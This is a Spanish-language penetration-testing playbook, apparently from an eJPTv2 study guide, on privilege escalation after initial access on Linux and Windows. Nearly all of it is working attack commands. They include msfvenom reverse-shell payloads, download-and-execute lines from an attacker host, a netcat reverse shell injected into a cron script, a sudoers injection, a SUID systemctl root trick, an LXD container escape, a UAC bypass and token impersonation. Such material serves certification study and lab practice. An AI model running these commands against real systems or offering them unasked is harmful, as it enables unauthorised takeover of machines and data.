# ⬆️ PLAYBOOK 6 — POST-EXPLOTACIÓN: ESCALADA DE PRIVILEGIOS

> **Objetivo:** Elevar privilegios de usuario normal a root/SYSTEM tras obtener acceso inicial.
> **Fuente:** Guia_eJPTv2_TFM — Carpetas 06/1-2, 10

---

## PARTE A — LINUX PRIVILEGE ESCALATION

### 6A.1 — Shell a Meterpreter (Linux)
```bash
# Crear payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f elf -o virus.elf
python3 -m http.server 80

# En la víctima
wget http://<ATTACKER_IP>/virus.elf && chmod +x virus.elf && ./virus.elf

# Listener MSF
msfconsole
use multi/handler
set LHOST <LHOST>
set LPORT 4444
set PAYLOAD linux/x64/meterpreter/reverse_tcp
run
```

#### Shell to Meterpreter (upgrade)
```bash
# Desde shell básica en MSF
use shell_to_meterpreter
set session 1
set lhost <LHOST>
run
sessions -i 2
```

### 6A.2 — LinPEAS (enumeración automática)
```bash
# Atacante: servir
python3 -m http.server 8080

# Víctima
wget http://<ATTACKER_IP>:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# O en memoria sin guardar
curl -L http://<ATTACKER_IP>/linpeas.sh | sh
```

### 6A.3 — sudo -l (GTFOBins)
```bash
sudo -l
# Buscar binarios con NOPASSWD en https://gtfobins.github.io/
# Usar ruta absoluta: /usr/bin/vim, /usr/bin/python3, etc.
```

### 6A.4 — Binarios SUID
```bash
find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null | grep '/bin'
# Buscar binarios extraños en https://gtfobins.github.io/
```

#### Ejemplo: systemctl SUID → root
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF

bash -p    # Shell como root
```

#### Ejemplo: SUID con binario custom
```bash
file <FILE>
strings <FILE>     # Encontrar binario llamado internamente
rm <BINARY>
cp /bin/bash <BINARY>
./<FILE>
```

### 6A.5 — Cron Jobs
```bash
crontab -l
cat /etc/crontab
find / -name <CRONJOB_SCRIPT>

# Inyectar reverse shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f" >> /var/www/.mysecretcronjob.sh

# O dar sudo al usuario
printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/<CRONJOB_SCRIPT>
```

### 6A.6 — Kernel Exploits
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### 6A.7 — LXC/LXD Container Escape
```bash
lxd init
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder && ./build-alpine

lxc image import ./alpine-*.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
# Acceso al filesystem real en /mnt/root
```

---

## PARTE B — WINDOWS PRIVILEGE ESCALATION

### 6B.1 — Shell a Meterpreter (Windows)
```bash
# Crear payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o virus.exe
# Para 64-bit
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o virus.exe

python3 -m http.server 80

# Listener MSF
msfconsole
use multi/handler
set LHOST <LHOST>
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

### 6B.2 — Local Exploit Suggester (Meterpreter)
```bash
background
search local_exploit_suggester
use post/multi/recon/local_exploit_suggester
set SESSION <N>
run

# Usar exploit encontrado (verde)
use exploit/windows/local/<EXPLOIT_NAME>
set SESSION <N>
set LHOST <LHOST>
set LPORT 5555
run
```

### 6B.3 — Getsystem (Meterpreter)
```bash
getprivs
getsystem
```

### 6B.4 — Kernel Exploits (Windows)

#### Windows-Exploit-Suggester
```bash
mkdir Windows-Exploit-Suggester && cd Windows-Exploit-Suggester
wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py
python ./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database YYYY-MM-DD-mssb.xlsx --systeminfo systeminfo.txt
```

#### Módulos MSF comunes
```bash
exploit/windows/local/ms10_092_schelevator
exploit/windows/local/ms14_058_track_popup_menu
exploit/windows/local/ms15_051_client_copy_image
exploit/windows/local/ms16_014_wmi_recv_notif
exploit/windows/local/cve_2019_1458_wizardopium
exploit/windows/local/cve_2020_1054_drawiconex_lpe
```

### 6B.5 — UAC Bypass (UACME)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > backdoor.exe

# En Meterpreter (sesión no privilegiada)
cd C:\\
mkdir Temp && cd Temp
upload /root/backdoor.exe
upload /root/Desktop/tools/UACME/Akagi64.exe
shell
Akagi64.exe 23 C:\Temp\backdoor.exe

# Módulos MSF UAC
exploit/windows/local/bypassuac_dotnet_profiler
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/bypassuac_sdclt
```

### 6B.6 — Access Token Impersonation
```bash
# Meterpreter (sesión no privilegiada)
pgrep explorer
migrate <explorer_PID>
getuid
getprivs

load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"
# Si falla:
impersonate_token "NT AUTHORITY\SYSTEM"
```

### 6B.7 — HotFixes / Patches (Enumeración Windows)
```powershell
Get-HotFix
(Get-HotFix).Count
wmic qfe list brief /format:table
```

### 6B.8 — Post-Enum MSF
```bash
use post/windows/gather/enum_patches
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_system
```
